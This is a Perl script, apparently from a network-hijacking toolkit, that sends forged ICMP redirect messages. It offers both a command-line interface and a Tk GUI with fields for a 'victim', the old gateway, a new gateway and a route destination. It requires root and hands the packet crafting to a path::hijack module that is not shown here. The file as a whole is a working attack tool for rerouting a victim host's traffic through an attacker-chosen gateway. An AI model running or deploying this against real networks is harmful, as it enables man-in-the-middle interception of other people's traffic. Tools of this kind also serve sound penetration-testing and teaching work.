#!/usr/bin/perl

eval 'exec /usr/bin/perl  -S $0 ${1+"$@"}'
    if 0; # not running under some shell
#
# ICMP-Redirection-Tool with Tk-Frontend 
# Author: stefan@krecher.de 
#
# Updated by Bastian Ballmann
#
# Last update: 24.07.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 

# Are you r00t?
die "You must be root...\n" if($> != 0);


###[ Loading modules ]###

use Getopt::Std;     
use path::hijack;
use path::config;
use strict;

# Do you have X and Tk?
BEGIN
{
    eval { require Tk; }; 
    import Tk unless $@;
};

###[ Global variables ]###

# Parameter hash
my %args;

# Tk objects
my $top;


###[ MAIN PART ]###

# Allow redirects
#open(REDIR,">/proc/sys/net/ipv4/conf/all/send_redirects") || die "Cannot write to /proc/sys/net/ipv4/conf/all/send_redirects!\n$!\n\n";
#print REDIR "0";
#close(REDIR);

# Load GUI version?
if($ARGV[0] eq "--gui")
{
    draw_gui();
}

# Terminal version
else
{
    # Need help?
    die "\nSend ICMP redirect messages\n---------------------------\n\n$0 -h <victim> -a <old_gw> -g <new_gw> -r <route>\nUse --gui to load the gui version\n\n" if(($ARGV[0] eq "--help") || (scalar(@ARGV) < 4));

    # Parsing parameter
    getopts('h:a:g:r:',\%args);
    icmp_redir_send();
}


###[ Subroutines ]###

#
# icmp_redir_send() - sends ICMP redirect messages 
sub icmp_redir_send() {
    
    # Check victim IP
    if(path::config::check_ip($args{'h'}) == 1)
    {
	print_error("Bad victim ip address $args{'h'}\n");
	return;
    }

    # Check old_gw IP
    if(path::config::check_ip($args{'a'}) == 1)
    {
	print_error("Bad old gateway ip address $args{'a'}\n");
	return;
    }

    # Check new_gw IP
    if(path::config::check_ip($args{'g'}) == 1)
    {
	print_error("Bad new gateway ip address $args{'g'}\n");
	return;
    }

    # Check route IP
    if(path::config::check_ip($args{'r'}) == 1)
    {
	print_error("Bad route ip address $args{'r'}\n");
	return;
    }

    # Parameter: victim, old_gw, new_gw, destination of route
    path::hijack::icmp_redirect($args{'h'}, $args{'a'}, $args{'g'}, $args{'r'});
    return 1;
}


# Print an error message
sub print_error { defined $top ? show_error($_[0]) : die $_[0]; }


###[ The GUI code ]###

sub draw_gui
{
    $top = MainWindow->new(-background => 'black');
    $top->title('ICMP-Redirector');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    $top->Label(-text => 'ICMP-Redirector,Stefan Krecher, 2002')->pack(-padx => "15p", -pady => 10);
    my $frame_victim = $top->Frame();
    my $frame_old_gw = $top->Frame();
    my $frame_new_gw = $top->Frame();
    my $frame_route_destination = $top->Frame();
    my $frame_buttons = $top->Frame();
    
    #
    # Victim
    #

    $frame_victim->Label(-text => 'Victim ')->pack(-side => 'left');
    $frame_victim->Entry(
			 -width => 20,
			 -textvariable => \$args{'h'},
			 )->pack(-side => 'left');

    #
    # old GW
    #

    $frame_old_gw->Label(-text => 'old GW ')->pack(-side => 'left');
    $frame_old_gw->Entry(
			 -width => 20,
			 -textvariable => \$args{'a'},
			 )->pack(-side => 'left');

   #
   # new GW
   #

    $frame_new_gw->Label(-text => 'new GW ')->pack(-side => 'left');
    $frame_new_gw->Entry(
			 -width => 20,
			 -textvariable => \$args{'g'},
			 )->pack(-side => 'left');
    
    #
    # route destination
    #

    $frame_route_destination->Label(-text => 'Destination of route ')->pack(-side => 'left');
    $frame_route_destination->Entry(
				    -width => 20,
				    -textvariable => \$args{'r'},
				    )->pack(-side => 'left');
    
    #
    # Buttons
    #

    $frame_buttons->Button(
			   -text => 'Send',
			   -activebackground => 'black',
			   -activeforeground => 'red',
			   -command => sub {  
			       icmp_redir_send();
			   }
			   )->pack(-side => 'left', -padx => 10, -pady => 5);
    
    $frame_buttons->Button(
			   -text => 'Quit',
			   -activebackground => 'black',
			   -activeforeground => 'red',
			   -command => sub { exit 0 }
			   )->pack(-side => 'left', -padx => 10, -pady => 5);
    
    $frame_victim->pack(-anchor => "e", -padx => "15");
    $frame_old_gw->pack(-anchor => "e", -padx => "15");
    $frame_new_gw->pack(-anchor => "e", -padx => "15");
    $frame_route_destination->pack(-anchor => "e", -padx => "15");
    $frame_buttons->pack(-anchor => "s", -pady => 10);
    
    MainLoop;
}


# Show Error Message
sub show_error
{
    my $msg =  shift;
    my $error = $top->Toplevel(-background => 'black');
    $error->title('Error');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    $error->Label(-text => $msg,
		  -border => '0')->pack(-padx => 10, -pady => 10, -side => 'top');

    $error->Button(-text => 'OK',
		   -activebackground => 'black',
		   -activeforeground => 'red',
		   -border => 0,
		   -command => sub { $error->destroy })->pack(-pady => 5, -side => 'bottom');
}
